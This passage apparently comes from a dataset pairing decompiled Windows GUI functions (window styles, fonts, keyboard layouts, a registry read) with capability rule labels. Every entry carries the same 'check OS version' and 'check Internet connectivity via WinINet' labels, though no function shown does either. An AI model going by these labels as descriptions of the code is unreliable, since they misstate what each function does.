fcn.00455e6c(0x456113);\n    return;\n}\n",
        "token_count": 1064
    },
    "004561fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004561fc(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1a6) != '\\0') && (iVar2 = fcn.0043ca38(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.0043c9fc();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x78))();\n            }\n            cVar1 = fcn.004033e4();\n            if (cVar1 != '\\0') {\n                fcn.004561fc(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "0045626c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045626c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1a6) != '\\0')) {\n        (**(*in_EAX + 0x78))();\n        if ((in_EAX[0x92] != 0) && (iVar1 = fcn.0044b754(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.0044b764();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.004561fc(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "00456344": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456344(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1a6) != '\\0') && (iVar2 = fcn.0043ca38(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.0043c9fc();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00456314(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004033e4(),  cVar1 != '\\0' && (cVar1 = fcn.00456344(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 238
    },
    "004563c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004563c0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1a6) != '\\0')) {\n        cVar1 = fcn.00456314(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00456314(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00456344(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00456444": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00456444(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1a6) != '\\0') && (iVar2 = fcn.0043ca38(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.0043c9fc();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00456414(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004033e4(),  cVar1 != '\\0' && (cVar1 = fcn.00456444(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 238
    },
    "004564c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004564c0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1a6) != '\\0')) {\n        cVar1 = fcn.00456414(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00456414(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00456444(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00456568": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00456568(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    unkbyte3 Var3;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x2c2) != 0) {\n        (**(in_EAX + 0x2c0))();\n    }\n    if ((((*(in_EAX + 0x248) == 0) || (*(*(in_EAX + 0x248) + 0x38) == 0)) || (uVar2 = fcn.00403454(),  uVar2 == '\\0'))\n       && (uVar2 = fcn.00456514(&stack0xfffffffc),  uVar2 == '\\0')) {\n        uVar1 = 0;\n        Var3 = 0;\n    }\n    else {\n        Var3 = uVar2 >> 8;\n        uVar1 = 1;\n    }\n    return CONCAT31(Var3, uVar1);\n}\n",
        "token_count": 231
    },
    "004565e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004565e4(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x250) != 0) && (iVar1 = (****(arg_8h + 0x250))(*(arg_8h + 0x250), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.00419cac(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 145
    },
    "00456668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00456668(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x461cd4 != NULL)) {\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0043fd08(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x2e0) == '\\0') && (*(in_EAX + 0x2e8) == '\\0')) {\n                uVar2 = fcn.0043fd08(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.0043fd08(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.0043fd08(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar3 = *(*(in_EAX + 0x2e0) * 4 + 0x461d58) | *(*(in_EAX + 0x2e8) * 4 + 0x461d60);\n                uVar2 = fcn.0043fd08(*(in_EAX + 0x2ec), uVar3 & 0xffffff00 | *(in_EAX + 0x2e1), uVar3);\n                (**0x461cd4)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "00456790": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456790(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x461cd4 != 0)) &&\n       ((*(in_EAX + 0x2e0) != '\\0' || (*(in_EAX + 0x2e8) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "004567bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004567bc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xe0))();\n    fcn.0045156c();\n    fcn.004532e0();\n    fcn.0043e8e4();\n    fcn.004535dc();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 193
    },
    "00456ca8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00456ca8(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041951c();\n    puVar2 = *0x461ec8;\n    (*0x461ec8)[1] = in_EAX;\n    *puVar2 = 0x45704c;\n    puVar2 = *0x461ed4;\n    (*0x461ed4)[1] = in_EAX;\n    *puVar2 = 0x457058;\n    fcn.00457064();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00403228();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00403228();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00403228();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00403228();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00403228();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x46201c)(0, 0, fcn.00453480, *(in_EAX + 0x58));\n    uVar3 = fcn.0041c71c();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.0041c71c();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.0041c71c();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.00457484();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x457360;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x457360;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x457360;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 772
    },
    "00456f78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00456f78(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00456ffc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00456ffc(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00413ca8();\n    fcn.00413ca8();\n    fcn.00459d50();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x463bb0 + 0x84) != 0)) {\n        fcn.0044122c();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00457144": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457144(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x4572ef;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00403228();\n        *(var_4h + 0x34) = uVar3;\n        fcn.00403fa8();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.00457144::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.004449d4();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x4571fc;\n                    uStack656 = fcn.00408c38(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x457207;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x4572ab;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x457338, 0, 0, &fcn.00457144::var_214h, &fcn.00457144::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.00404218();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.00404218();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x4572b2);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x1d) = 0;\n        fcn.0041570c();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x4572f6;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 836
    },
    "00457484": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00457484(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x463bb0 != 0) {\n        var_1h._0_1_ = *(*0x463bb0 + 0x88);\n    }\n    uStack420 = 0x4575c9;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x463bb0 != 0) {\n        fcn.00459974();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.0041caac();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.0041caac();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.0041cb90();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.0041caac();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.0041caac();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.0041caac();\n    }\n    fcn.0041c8f0();\n    fcn.0041c8f0();\n    *in_FS_OFFSET = puStack464;\n    if (*0x463bb0 != 0) {\n        fcn.00459974(0x4575d0);\n    }\n    return;\n}\n",
        "token_count": 589
    },
    "004575e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004575e0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.00457600();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00457668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00457668(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x22b) == '\\x02')) {\n        var_8h = in_EAX[0x10];\n        var_ch = in_EAX[0x11];\n        iVar3 = (***0x461f44)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x84))(var_10h, iVar3);\n    if (*(in_EAX + 0x22b) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x4577a4\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 990
    },
    "00457818": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00457818(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x22b) != '\\x01')))) {\n        fcn.00413a08();\n    }\n    iVar2 = fcn.00456f70();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00456f5c();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x22b) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.00413b64();\n                    cVar1 = fcn.00457608();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00413be0();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.00413b64();\n            fcn.00457668(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "00457964": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00457964(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00456f70();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00456f5c();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x22b) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 201
    },
    "00457a44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457a44(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x457a72;\n    var_4h = in_EAX;\n    fcn.004575d8();\n    uStack36 = 0x457abd;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.00457a44::var_14h, 0);\n    fcn.004579bc();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.004575e0(0x457ac4);\n    return;\n}\n",
        "token_count": 310
    },
    "00457ad8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457ad8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.00403ffc();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 106
    },
    "00457b10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
